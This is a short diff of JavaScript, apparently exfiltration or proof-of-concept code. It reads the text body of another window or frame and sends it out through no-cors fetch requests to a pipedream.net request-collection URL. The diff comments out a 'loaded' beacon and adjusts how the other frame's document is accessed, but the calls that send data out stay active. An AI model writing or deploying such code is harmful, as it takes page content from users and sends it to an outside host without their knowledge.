@@ -20,7 +20,7 @@ try{
 
 
 
-		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?loaded', {mode: 'no-cors'});
+		//fetch('https://en6gc9c8vfzvo.x.pipedream.net/?loaded', {mode: 'no-cors'});
 
     	try{
 
@@ -43,7 +43,7 @@ try{
 					fetch('https://en6gc9c8vfzvo.x.pipedream.net/?bodynew=' + cc, {mode: 'no-cors'});
 
 					try{
-						var dd = aaa.document.body.textContent
+						var dd = aaa.window.document.body.textContent
 						fetch('https://en6gc9c8vfzvo.x.pipedream.net/?documentnewtext=' + dd, {mode: 'no-cors'});
 						
 					} catch (error) {
